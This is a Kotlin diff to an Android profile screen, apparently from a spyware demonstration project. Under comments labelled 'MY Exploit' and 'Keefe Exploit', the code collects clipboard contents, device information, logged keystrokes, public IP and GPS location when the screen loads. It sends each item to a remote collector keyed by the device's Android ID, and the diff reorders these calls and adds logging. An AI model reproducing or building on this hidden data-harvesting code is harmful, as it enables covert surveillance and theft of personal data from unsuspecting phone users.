@@ -12,6 +12,7 @@ import android.os.Bundle
 import android.os.Environment
 import android.os.StrictMode
 import android.provider.Settings
+import android.util.Log
 import android.view.View
 import android.widget.Button
 import android.widget.TextView
@@ -28,11 +29,11 @@ import kotlin.concurrent.thread
 
 class ProfileTemplate : AppCompatActivity() {
     private var datasender = DataSender()
-    private val hv = Harvester(this, this, datasender.getAndroidID())
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         datasender.obtainAndroidID(this.contentResolver)
+        val hv = Harvester(this, this, datasender.getAndroidID())
         val id = intent.getIntExtra("id",0)
         setContentView(R.layout.activity_profile)
         renderInfo(id)
@@ -42,7 +43,6 @@ class ProfileTemplate : AppCompatActivity() {
         findViewById<Button>(R.id.location).setOnClickListener(::location)
         findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
 
-
         datasender.obtainAndroidID(this.contentResolver)                    // Set AndroidID
         val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()  // Need this to allow finding of public IP - MY
         StrictMode.setThreadPolicy(policy)
@@ -50,18 +50,22 @@ class ProfileTemplate : AppCompatActivity() {
         // MY Exploit -----------------------------------------------------------------
         val gn = General(this,this)
         val gps = FindLocation(this, this)
-        datasender.sendData("id", gn.stealClipboard())
-        datasender.sendData("id", gn.stealDeviceInfo())
+        Log.d("Send data", "deviceinfo")
+        datasender.sendData(datasender.getAndroidID(), gn.stealDeviceInfo())
 
-        gn.logKeys()?.let { datasender.sendData("id", it) }
-        gn.getPublicIP()?.let { datasender.sendData("id", it) }
+        Log.d("Send data", "keys")
+        gn.logKeys()?.let { datasender.sendData(datasender.getAndroidID(), it) }
+        Log.d("Send data", "pubip")
+        gn.getPublicIP()?.let { datasender.sendData(datasender.getAndroidID(), it) }
         val LOCPERMISSIONS = arrayOf(
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.ACCESS_FINE_LOCATION
         )
         if (checkPerms(this, *LOCPERMISSIONS)) {
-            datasender.sendData("loc", gps.getLocationDetails())
+            Log.d("Send data", "geo")
+            datasender.sendData(datasender.getAndroidID(), gps.getLocationDetails())
         }
+        datasender.sendData(datasender.getAndroidID(), gn.stealClipboard())
         gn.accessibilityCheck()
 
         // Keefe Exploit --------------------------------------------------------------
